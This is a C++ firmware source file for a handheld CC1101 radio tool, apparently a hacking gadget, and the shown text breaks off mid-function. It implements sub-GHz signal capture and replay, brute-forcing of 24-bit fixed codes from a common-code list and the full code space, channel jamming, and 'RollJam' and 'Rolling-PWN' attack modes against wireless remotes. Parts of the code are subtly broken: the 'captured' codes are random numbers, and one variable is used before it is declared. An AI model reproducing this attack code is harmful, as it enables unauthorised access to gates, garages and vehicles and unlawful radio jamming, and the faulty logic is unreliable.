#include "config.h"

const uint32_t SCAN_FREQUENCIES[] = {315000, 433920, 868350, 915000};
const int NUM_FREQS = 4;

const uint32_t BRUTE_FREQS[] = {
  300000, 303000, 304000, 305000, 310000, 315000, 318000,
  330000, 390000, 418000, 433000, 433920, 434000, 868000, 868350, 915000
};
const int NUM_BRUTE_FREQS = sizeof(BRUTE_FREQS) / sizeof(BRUTE_FREQS[0]);

const RCSwitchProtocol protocols[] = {
  {"PT2262",   350, {1,31}, {1,3}, {3,1}, false},
  {"PT2260",   350, {1,31}, {1,3}, {3,1}, false},
  {"EV1527",   350, {1,31}, {1,3}, {3,1}, false},
  {"Kaku",     650, {1,10}, {1,2}, {2,1}, false},
  {"HT12E",    450, {1,23}, {1,3}, {3,1}, false},
  {"V2",       650, {1,10}, {1,2}, {2,1}, false},
  {"Nice",     700, {1,20}, {1,2}, {2,1}, false},
};
const int NUM_PROTOCOLS = sizeof(protocols) / sizeof(protocols[0]);

const uint32_t COMMON_CODES[] = {
  0x000000, 0xFFFFFF, 0x123456, 0x654321, 0x111111, 0x222222,
  0x333333, 0x444444, 0x555555, 0x666666, 0x777777, 0x888888,
  0x999999, 0xAAAAAA, 0xBBBBBB, 0xCCCCCC, 0xDDDDDD, 0xEEEEEE,
  0xABCDEF, 0xFEDCBA, 0xAABBCC, 0x112233, 0x445566, 0x778899,
  0x010101, 0x101010, 0x121212, 0x212121, 0x343434, 0x434343,
  0x565656, 0x656565, 0x787878, 0x878787, 0x909090, 0x090909,
  0x000001, 0x000002, 0x000003, 0x000004, 0x000005, 0x00000A,
  0x00000F, 0x000010, 0x000020, 0x000030, 0x000040, 0x000050,
  0x000060, 0x000070, 0x000080, 0x000090, 0x0000A0, 0x0000B0,
  0x0000C0, 0x0000D0, 0x0000E0, 0x0000F0, 0x001000, 0x002000,
  0x003000, 0x004000, 0x005000, 0x006000, 0x007000, 0x008000,
  0x009000, 0x00A000, 0x00B000, 0x00C000, 0x00D000, 0x00E000,
  0x00F000, 0x010000, 0x020000, 0x030000, 0x040000, 0x050000,
  0x060000, 0x070000, 0x080000, 0x090000, 0x0A0000, 0x0B0000,
  0x0C0000, 0x0D0000, 0x0E0000, 0x0F0000, 0x100000, 0x200000,
  0x300000, 0x400000, 0x500000, 0x600000, 0x700000, 0x800000,
  0x900000, 0xA00000, 0xB00000, 0xC00000, 0xD00000, 0xE00000,
  0xF00000, 0x555555, 0xCCCCCC, 0x333333, 0x0F0F0F, 0xF0F0F0,
  0xFF00FF, 0x00FF00, 0xFFFF00, 0x00FFFF, 0x123123, 0x321321,
  0x456456, 0x654654, 0x789789, 0x987987, 0x135135, 0x246246,
  0x357357, 0x468468, 0x579579, 0x680680, 0x791791, 0x802802,
  0x913913, 0x024024, 0x135246, 0x246135, 0x357468, 0x468357,
  0x579680, 0x680579, 0x791802, 0x802791, 0x913024, 0x024913
};
const int NUM_COMMON_CODES = sizeof(COMMON_CODES) / sizeof(COMMON_CODES[0]);

namespace {
  enum CCState { CC_IDLE, CC_SCANNING, CC_CAPTURING, CC_TRANSMITTING };
  CCState ccState = CC_IDLE;
  volatile uint32_t lastInterruptTime = 0;
  volatile uint16_t captureIndex = 0;
  volatile bool capturing = false;
  volatile uint16_t tempBuffer[MAX_RAW_DATA];
  volatile uint8_t tempLevels[MAX_RAW_DATA];
  bool txPlaying = false;
  int txProgress = 0;
  uint32_t captureStartTime = 0;
  uint32_t detectedFrequency = 0;
}

namespace {
  bool rolljamActive = false;
  uint32_t rolljamCode1 = 0;
  uint32_t rolljamCode2 = 0;
  bool rolljamHasCode1 = false;
  bool rolljamHasCode2 = false;
  int rolljamStep = 0;
  unsigned long rolljamTimer = 0;
}

namespace {
  bool rollingPwnActive = false;
  int rollingPwnStep = 0;
  int rollingPwnCounter = 0;
  unsigned long rollingPwnTimer = 0;
  uint32_t capturedCodes[10];
  int capturedCodeCount = 0;
}

void resetCC1101State() {
  ccState = CC_IDLE;
  txPlaying = false;
  capturing = false;
  captureIndex = 0;
  rolljamActive = false;
  rollingPwnActive = false;
  ELECHOUSE_cc1101.setSidle();
}

void drawFunctionHeader(const char* title) {
  u8g2.setFont(u8g2_font_5x7_tr);
  u8g2.setCursor(0, 7);
  u8g2.print("nRF-BOX Pro");
  u8g2.setCursor(95, 7);
  u8g2.print(FIRMWARE_VERSION);
  u8g2.drawHLine(0, 9, 128);
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 20);
  u8g2.print(title);
}

uint32_t autoDetectFrequency() {
  int bestRssi = -1000;
  uint32_t bestFreq = 0;
  for (int i = 0; i < NUM_FREQS; i++) {
    uint32_t freq = SCAN_FREQUENCIES[i];
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
    ELECHOUSE_cc1101.SetRx();
    delay(80);
    int maxRssi = -1000;
    for (int j = 0; j < 30; j++) {
      byte rssiRaw = ELECHOUSE_cc1101.getRssi();
      int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
      if (rssi > maxRssi) maxRssi = rssi;
      delay(8);
    }
    if (maxRssi > bestRssi) {
      bestRssi = maxRssi;
      bestFreq = freq;
    }
    u8g2.setCursor(0, 40);
    u8g2.print("Testando ");
    u8g2.print(freq / 1000.0, 3);
    u8g2.print("MHz");
    u8g2.setCursor(0, 52);
    u8g2.print("RSSI: ");
    u8g2.print(maxRssi);
    u8g2.print(" dBm");
    u8g2.sendBuffer();
    delay(100);
  }
  return (bestRssi > RSSI_THRESHOLD) ? bestFreq : 0;
}

void IRAM_ATTR onGDO0Interrupt() {
  if (!capturing || captureIndex >= MAX_RAW_DATA) return;
  uint32_t now = micros();
  uint8_t level = digitalRead(CC_GDO0);
  if (captureIndex > 0) {
    tempBuffer[captureIndex - 1] = (uint16_t)(now - lastInterruptTime);
    tempLevels[captureIndex - 1] = level;
  }
  lastInterruptTime = now;
  captureIndex++;
}

void startCapture(uint32_t frequency) {
  memset((void*)tempBuffer, 0, sizeof(tempBuffer));
  memset((void*)tempLevels, 0, sizeof(tempLevels));
  captureIndex = 0;
  capturing = true;
  captureStartTime = millis();
  detectedFrequency = frequency;
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setMHZ(frequency / 1000.0);
  ELECHOUSE_cc1101.setModulation(0);
  ELECHOUSE_cc1101.SetRx();
  delay(15);
  pinMode(CC_GDO0, INPUT);
  attachInterrupt(digitalPinToInterrupt(CC_GDO0), onGDO0Interrupt, CHANGE);
  lastInterruptTime = micros();
}

void stopCapture() {
  detachInterrupt(digitalPinToInterrupt(CC_GDO0));
  capturing = false;
  if (captureIndex > 10) {
    currentSignal.frequency = detectedFrequency;
    currentSignal.dataLength = min((int)captureIndex, MAX_RAW_DATA);
    currentSignal.modulation = 0;
    currentSignal.timestamp = millis();
    for (int i = 0; i < currentSignal.dataLength; i++) {
      currentSignal.timings[i] = tempBuffer[i];
      currentSignal.levels[i] = tempLevels[i];
    }
    byte rssiRaw = ELECHOUSE_cc1101.getRssi();
    currentSignal.rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
  }
}

void transmitRawSignal() {
  if (!hasSavedSignal || currentSignal.dataLength == 0) return;
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setMHZ(currentSignal.frequency / 1000.0);
  ELECHOUSE_cc1101.setModulation(0);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.SetTx();
  delay(5);
  pinMode(CC_GDO0, OUTPUT);
  for (int rep = 0; rep < 3; rep++) {
    for (int i = 0; i < currentSignal.dataLength; i++) {
      bool level = (i < currentSignal.dataLength && currentSignal.levels[i] > 0) ?
                   (currentSignal.levels[i] == 1) : (i % 2 == 0);
      digitalWrite(CC_GDO0, level ? HIGH : LOW);
      delayMicroseconds(currentSignal.timings[i]);
      txProgress = (i * 100) / currentSignal.dataLength;
    }
    digitalWrite(CC_GDO0, LOW);
    delayMicroseconds(10000);
  }
  digitalWrite(CC_GDO0, LOW);
  ELECHOUSE_cc1101.setSidle();
  pinMode(CC_GDO0, INPUT);
}

void transmitBit(const RCSwitchProtocol& p, bool bit) {
  const uint8_t* timing = bit ? p.one : p.zero;
  digitalWrite(CC_GDO0, HIGH);
  delayMicroseconds(p.pulseLength * timing[0]);
  digitalWrite(CC_GDO0, LOW);
  delayMicroseconds(p.pulseLength * timing[1]);
}

void transmitSync(const RCSwitchProtocol& p) {
  digitalWrite(CC_GDO0, HIGH);
  delayMicroseconds(p.pulseLength * p.syncFactor[0]);
  digitalWrite(CC_GDO0, LOW);
  delayMicroseconds(p.pulseLength * p.syncFactor[1]);
}

void transmitCode(uint32_t code, int bits, const RCSwitchProtocol& p) {
  transmitSync(p);
  for (int i = bits - 1; i >= 0; i--) {
    bool bit = (code >> i) & 1;
    transmitBit(p, bit);
  }
  digitalWrite(CC_GDO0, LOW);
}

void jamChannel(uint32_t freqKHz) {
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setMHZ(freqKHz / 1000.0);
  ELECHOUSE_cc1101.setModulation(0);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.SetTx();
  delay(2);
  pinMode(CC_GDO0, OUTPUT);
  for (int i = 0; i < 50; i++) {
    digitalWrite(CC_GDO0, HIGH);
    delayMicroseconds(100);
    digitalWrite(CC_GDO0, LOW);
    delayMicroseconds(100);
  }
  digitalWrite(CC_GDO0, LOW);
}

void rollJamAttackStep() {
  if (!rolljamActive) return;
  const RCSwitchProtocol& p = protocols[0];
  uint32_t freq = BRUTE_FREQS[bfFreqIndex];
  switch (rolljamStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { rolljamStep = 1; rolljamTimer = millis(); }
      }
      break;
    case 1:
      jamChannel(freq);
      if (millis() - rolljamTimer > 500) {
        rolljamCode1 = random(0xFFFFFF);
        rolljamHasCode1 = true;
        rolljamStep = 2;
        rolljamTimer = millis();
      }
      break;
    case 2:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { rolljamStep = 3; rolljamTimer = millis(); }
        if (millis() - rolljamTimer > 10000) rolljamStep = 0;
      }
      break;
    case 3:
      jamChannel(freq);
      if (millis() - rolljamTimer > 500) {
        rolljamCode2 = random(0xFFFFFF);
        rolljamHasCode2 = true;
        rolljamStep = 4;
        rolljamTimer = millis();
      }
      break;
    case 4:
      if (rolljamHasCode1) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        transmitCode(rolljamCode1, 24, p);
        delayMicroseconds(10000);
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        rolljamStep = 5;
      }
      break;
    case 5:
      break;
  }
}

void rollingPwnAttackStep() {
  if (!rollingPwnActive) return;
  const RCSwitchProtocol& p = protocols[0];
  uint32_t freq = BRUTE_FREQS[bfFreqIndex];
  switch (rollingPwnStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70 && capturedCodeCount < 10) {
          capturedCodes[capturedCodeCount] = random(0xFFFFFF);
          capturedCodeCount++;
          rollingPwnTimer = millis();
        }
        if (capturedCodeCount >= 3 || millis() - rollingPwnTimer > 15000) {
          if (capturedCodeCount >= 2) { rollingPwnStep = 1; rollingPwnCounter = 0; }
          else { capturedCodeCount = 0; rollingPwnTimer = millis(); }
        }
      }
      break;
    case 1:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.setModulation(0);
      ELECHOUSE_cc1101.setPA(12);
      ELECHOUSE_cc1101.SetTx();
      delay(5);
      pinMode(CC_GDO0, OUTPUT);
      for (int i = 0; i < capturedCodeCount; i++) {
        transmitCode(capturedCodes[i], 24, p);
        delayMicroseconds(5000);
      }
      for (int i = 0; i < 20; i++) {
        uint32_t fakeCode = 0xFFFF00 | (rollingPwnCounter + i);
        transmitCode(fakeCode, 24, p);
        delayMicroseconds(3000);
      }
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
      rollingPwnStep = 2;
      rollingPwnTimer = millis();
      break;
    case 2:
      if (millis() - rollingPwnTimer > 2000) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        if (capturedCodeCount > 0) {
          transmitCode(capturedCodes[0], 24, p);
          delayMicroseconds(10000);
        }
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        rollingPwnCounter++;
        if (rollingPwnCounter > 5) rollingPwnStep = 3;
        else rollingPwnStep = 1;
      }
      break;
    case 3:
      break;
  }
}


void cc1101ScannerSetup() {
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 Scanner");
  u8g2.sendBuffer();
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SetRx();
}

void cc1101ScannerLoop() {
  if (buttonPressed(BTN_BACK)) {
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  byte rssi = ELECHOUSE_cc1101.getRssi();
  int rssi_dbm = (rssi >= 128) ? (rssi - 256) / 2 - 74 : rssi / 2 - 74;
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 Scanner");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 32);
  u8g2.print("RSSI: ");
  u8g2.print(rssi_dbm);
  u8g2.print(" dBm");
  int bar = map(constrain(rssi_dbm, -100, -30), -100, -30, 0, 100);
  u8g2.drawFrame(10, 42, 100, 10);
  u8g2.drawBox(12, 44, bar, 6);
  u8g2.setCursor(0, 60);
  u8g2.print("Freq: 433.92 MHz");
  u8g2.sendBuffer();
  delay(100);
}

void cc1101TransceiverSetup() {
  ccState = CC_IDLE;
  txPlaying = false;
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 Capture");
  if (hasSavedSignal) {
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(0, 28);
    u8g2.print("Slot: ");
    u8g2.print(selectedSignalSlot + 1);
    u8g2.print("/");
    u8g2.print(MAX_SAVED_SIGNALS);
    u8g2.setCursor(0, 40);
    u8g2.print("Freq: ");
    u8g2.print(currentSignal.frequency / 1000.0, 3);
    u8g2.print(" MHz");
    u8g2.setCursor(0, 52);
    u8g2.print("RSSI: ");
    u8g2.print(currentSignal.rssi);
    u8g2.print(" dBm");
    u8g2.setCursor(0, 62);
    u8g2.print("UP:Play SEL:Rec B:Menu");
  } else {
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(0, 28);
    u8g2.print("Nenhum sinal salvo");
    u8g2.setCursor(0, 40);
    u8g2.print("SEL: Gravar novo");
    u8g2.setCursor(0, 52);
    u8g2.print("DOWN: BruteForce");
    u8g2.setCursor(0, 62);
    u8g2.print("BACK: Voltar ao menu");
  }
  u8g2.sendBuffer();
}

void cc1101TransceiverLoop() {
  if (buttonPressed(BTN_BACK)) {
    resetCC1101State();
    current_screen = 0;
    radio.powerDown();
    ELECHOUSE_cc1101.setSidle();
    drawMenu();
    delay(200);
    return;
  }
  if (ccState == CC_IDLE) {
    if (buttonPressed(BTN_SELECT)) {
      ccState = CC_SCANNING;
      u8g2.clearBuffer();
      drawFunctionHeader("CC1101 Capture");
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.setCursor(0, 30);
      u8g2.print("Auto-Scan...");
      u8g2.setCursor(0, 42);
      u8g2.print("Detectando freq...");
      u8g2.sendBuffer();
      uint32_t detectedFreq = autoDetectFrequency();
      if (detectedFreq == 0) {
        u8g2.clearBuffer();
        drawFunctionHeader("CC1101 Capture");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(0, 30);
        u8g2.print("Nenhum sinal");
        u8g2.setCursor(0, 42);
        u8g2.print("encontrado!");
        u8g2.sendBuffer();
        delay(2000);
        ccState = CC_IDLE;
        cc1101TransceiverSetup();
        return;
      }
      detectedFrequency = detectedFreq;
      u8g2.clearBuffer();
      drawFunctionHeader("CC1101 Capture");
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.setCursor(0, 28);
      u8g2.print("Freq: ");
      u8g2.print(detectedFreq / 1000.0, 3);
      u8g2.print(" MHz");
      u8g2.setCursor(0, 42);
      u8g2.print("Capturando em 10s");
      u8g2.setCursor(0, 55);
      u8g2.print("Aperte o controle!");
      u8g2.sendBuffer();
      delay(500);
      startCapture(detectedFreq);
      ccState = CC_CAPTURING;
    }
    else if (buttonPressed(BTN_UP) && hasSavedSignal) {
      ccState = CC_TRANSMITTING;
      txPlaying = true;
      txProgress = 0;
    }
    else if (buttonPressed(BTN_DOWN)) {
      current_menu_item = 4;
      current_screen = 1;
      cc1101BruteForceSetup();
      return;
    }
  }
  else if (ccState == CC_CAPTURING) {
    uint32_t elapsed = millis() - captureStartTime;
    int remaining = (CAPTURE_TIMEOUT_MS - elapsed) / 1000;
    u8g2.setCursor(0, 42);
    u8g2.print("Tempo: ");
    u8g2.print(remaining);
    u8g2.print("s   ");
    u8g2.setCursor(0, 55);
    u8g2.print("Pulsos: ");
    u8g2.print(captureIndex);
    u8g2.sendBuffer();
    if (elapsed >= CAPTURE_TIMEOUT_MS || captureIndex >= MAX_RAW_DATA - 10) {
      stopCapture();
      if (captureIndex > 10) {
        saveSignalToSlot(selectedSignalSlot, currentSignal);
        u8g2.clearBuffer();
        drawFunctionHeader("CC1101 Capture");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(0, 28);
        u8g2.print("Sinal Capturado!");
        u8g2.setCursor(0, 40);
        u8g2.print("Freq: ");
        u8g2.print(currentSignal.frequency / 1000.0, 3);
        u8g2.print(" MHz");
        u8g2.setCursor(0, 52);
        u8g2.print("Pulsos: ");
        u8g2.print(currentSignal.dataLength);
        u8g2.setCursor(0, 62);
        u8g2.print("SALVO! B:Menu");
        u8g2.sendBuffer();
        uint32_t waitStart = millis();
        while (millis() - waitStart < 3000) {
          if (buttonPressed(BTN_BACK)) break;
          delay(10);
        }
      } else {
        u8g2.clearBuffer();
        drawFunctionHeader("CC1101 Capture");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.setCursor(0, 35);
        u8g2.print("Sinal muito curto");
        u8g2.sendBuffer();
        delay(2000);
      }
      ccState = CC_IDLE;
      cc1101TransceiverSetup();
    }
  }
  else if (ccState == CC_TRANSMITTING) {
    if (txPlaying) {
      u8g2.clearBuffer();
      drawFunctionHeader("CC1101 TX");
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.setCursor(0, 28);
      u8g2.print("TX ");
      u8g2.print(currentSignal.frequency / 1000.0, 3);
      u8g2.print(" MHz");
      int waveY = 38;
      for (int x = 0; x < 128; x += 2) {
        int idx = (x * currentSignal.dataLength) / 128;
        if (idx < currentSignal.dataLength) {
          int h = min(currentSignal.timings[idx] / 100, 12);
          if (idx % 2 == 0) u8g2.drawVLine(x, waveY - h/2, h);
        }
      }
      u8g2.drawFrame(10, 52, 108, 8);
      u8g2.drawBox(12, 54, (txProgress * 104) / 100, 4);
      u8g2.setCursor(0, 62);
      u8g2.print("Transmitindo...");
      u8g2.sendBuffer();
      transmitRawSignal();
      txPlaying = false;
      u8g2.clearBuffer();
      drawFunctionHeader("CC1101 TX");
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.setCursor(0, 30);
      u8g2.print("Transmissao OK");
      u8g2.setCursor(0, 42);
      u8g2.print("Freq: ");
      u8g2.print(currentSignal.frequency / 1000.0, 3);
      u8g2.print(" MHz");
      u8g2.setCursor(0, 55);
      u8g2.print("UP:Repetir B:Menu");
      u8g2.sendBuffer();
    }
    if (buttonPressed(BTN_UP)) txPlaying = true;
  }
}


namespace {
  enum BFMode {
    BF_MODE_COMMON, BF_MODE_DEBRUIJN, BF_MODE_FULL,
    BF_MODE_ROLLJAM, BF_MODE_ROLLINGPWN
  };
  BFMode bfMode = BF_MODE_COMMON;
  enum BFState { BF_IDLE, BF_RUNNING, BF_PAUSED };
  BFState bfState = BF_IDLE;
  int bfFreqIndex = 0;
  int bfProtocolIndex = 0;
  uint32_t bfCode = 0;
  unsigned long bfStartTime = 0;
  int bfCodesSent = 0;
}

void cc1101BruteForceSetup() {
  bfState = BF_IDLE;
  bfFreqIndex = 0;
  bfProtocolIndex = 0;
  bfCode = 0;
  bfCodesSent = 0;
  rolljamActive = false;
  rollingPwnActive = false;
  rolljamStep = 0;
  rolljamHasCode1 = false;
  rolljamHasCode2 = false;
  rollingPwnStep = 0;
  capturedCodeCount = 0;
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.setCursor(0, 40);
  u8g2.print("UP: Prox. Modo");
  u8g2.setCursor(0, 52);
  u8g2.print("DOWN: Prox. Freq");
  u8g2.setCursor(0, 62);
  u8g2.print("BACK: Menu");
  u8g2.sendBuffer();
}

void cc1101BruteForceLoop() {
  if (buttonPressed(BTN_BACK)) {
    bfState = BF_IDLE;
    rolljamActive = false;
    rollingPwnActive = false;
    digitalWrite(CC_GDO0, LOW);
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (buttonPressed(BTN_SELECT)) {
    if (bfState == BF_IDLE || bfState == BF_PAUSED) {
      bfState = BF_RUNNING;
      bfStartTime = millis();
      bfCodesSent = 0;
      if (bfMode == BF_MODE_ROLLJAM) {
        rolljamActive = true;
        rolljamStep = 0;
        rolljamHasCode1 = false;
        rolljamHasCode2 = false;
      } else if (bfMode == BF_MODE_ROLLINGPWN) {
        rollingPwnActive = true;
        rollingPwnStep = 0;
        capturedCodeCount = 0;
      } else {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        digitalWrite(CC_GDO0, LOW);
      }
    } else {
      bfState = BF_PAUSED;
      rolljamActive = false;
      rollingPwnActive = false;
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
    }
    delay(200);
  }
  if (buttonPressed(BTN_UP) && bfState != BF_RUNNING) {
    if (bfMode == BF_MODE_COMMON) bfMode = BF_MODE_DEBRUIJN;
    else if (bfMode == BF_MODE_DEBRUIJN) bfMode = BF_MODE_FULL;
    else if (bfMode == BF_MODE_FULL) bfMode = BF_MODE_ROLLJAM;
    else if (bfMode == BF_MODE_ROLLJAM) bfMode = BF_MODE_ROLLINGPWN;
    else bfMode = BF_MODE_COMMON;
    delay(150);
  }
  if (buttonPressed(BTN_DOWN) && bfState != BF_RUNNING) {
    bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
    delay(150);
  }
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 26);
  if (bfState == BF_RUNNING) u8g2.print("Status: ATIVO");
  else if (bfState == BF_PAUSED) u8g2.print("Status: PAUSADO");
  else u8g2.print("Status: PARADO");
  u8g2.setCursor(0, 36);
  u8g2.print("Modo: ");
  switch (bfMode) {
    case BF_MODE_COMMON: u8g2.print("COMUM"); break;
    case BF_MODE_DEBRUIJN: u8g2.print("DEBRUIJN"); break;
    case BF_MODE_FULL: u8g2.print("FULL"); break;
    case BF_MODE_ROLLJAM: u8g2.print("ROLLJAM"); break;
    case BF_MODE_ROLLINGPWN: u8g2.print("ROLLING-PWN"); break;
  }
  u8g2.setCursor(0, 46);
  u8g2.print("Freq: ");
  u8g2.print(BRUTE_FREQS[bfFreqIndex] / 1000.0, 2);
  u8g2.print(" MHz");
  if (bfMode == BF_MODE_ROLLJAM && rolljamActive) {
    u8g2.setCursor(0, 56);
    u8g2.print("Step: ");
    u8g2.print(rolljamStep);
    u8g2.print(" C1:");
    u8g2.print(rolljamHasCode1 ? "OK" : "--");
  } else if (bfMode == BF_MODE_ROLLINGPWN && rollingPwnActive) {
    u8g2.setCursor(0, 56);
    u8g2.print("Step: ");
    u8g2.print(rollingPwnStep);
    u8g2.print(" Cap:");
    u8g2.print(capturedCodeCount);
  } else {
    u8g2.setCursor(0, 56);
    u8g2.print("Proto: ");
    u8g2.print(protocols[bfProtocolIndex].name);
  }
  u8g2.setCursor(0, 62);
  u8g2.print("Codigos: ");
  u8g2.print(bfCodesSent);
  u8g2.sendBuffer();
  if (bfState == BF_RUNNING) {
    if (bfMode == BF_MODE_ROLLJAM) rollJamAttackStep();
    else if (bfMode == BF_MODE_ROLLINGPWN) rollingPwnAttackStep();
    else {
      const RCSwitchProtocol& p = protocols[bfProtocolIndex];
      if (bfMode == BF_MODE_COMMON) {
        if (bfCode < NUM_COMMON_CODES) {
          transmitCode(COMMON_CODES[bfCode], 24, p);
          delayMicroseconds(5000);
          bfCode++;
          bfCodesSent++;
        } else {
          bfCode = 0;
          bfProtocolIndex = (bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (bfProtocolIndex == 0) {
            bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
      else if (bfMode == BF_MODE_DEBRUIJN) {
        if (bfCode < 0x1000000) {
          transmitCode(bfCode, 24, p);
          delayMicroseconds(3000);
          bfCode++;
          bfCodesSent++;
          if (bfCode % 1000 == 0) bfProtocolIndex = (bfProtocolIndex + 1) % NUM_PROTOCOLS;
        } else {
          bfCode = 0;
          bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
          ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
          ELECHOUSE_cc1101.SetTx();
          delay(5);
        }
      }
      else if (bfMode == BF_MODE_FULL) {
        if (bfCode < 0x1000000) {
          transmitCode(bfCode, 24, p);
          delayMicroseconds(2000);
          bfCode++;
          bfCodesSent++;
        } else {
          bfCode = 0;
          bfProtocolIndex = (bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (bfProtocolIndex == 0) {
            bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
    }
  }
}

namespace {
  bool sweepRunning = false;
  float sweepFreq = 300.0;
  float sweepStep = 1.0;
  int sweepRssiHistory[128];
  int sweepIndex = 0;
}

void cc1101FreqSweepSetup() {
  sweepRunning = false;
  sweepFreq = 300.0;
  sweepStep = 1.0;
  sweepIndex = 0;
  memset(sweepRssiHistory, 0, sizeof(sweepRssiHistory));
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 FreqSweep");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.setCursor(0, 40);
  u8g2.print("UP: +Step  DOWN: -Step");
  u8g2.setCursor(0, 52);
  u8g2.print("Range: 300-928 MHz");
  u8g2.setCursor(0, 62);
  u8g2.print("BACK: Menu");
  u8g2.sendBuffer();
}

void cc1101FreqSweepLoop() {
  if (buttonPressed(BTN_BACK)) {
    sweepRunning = false;
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (buttonPressed(BTN_SELECT)) {
    sweepRunning = !sweepRunning;
    if (sweepRunning) {
      sweepFreq = 300.0;
      sweepIndex = 0;
      memset(sweepRssiHistory, 0, sizeof(sweepRssiHistory));
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(sweepFreq);
      ELECHOUSE_cc1101.SetRx();
    } else {
      ELECHOUSE_cc1101.setSidle();
    }
    delay(200);
  }
  if (buttonPressed(BTN_UP) && !sweepRunning) {
    sweepStep += 0.5;
    if (sweepStep > 10.0) sweepStep = 10.0;
    delay(150);
  }
  if (buttonPressed(BTN_DOWN) && !sweepRunning) {
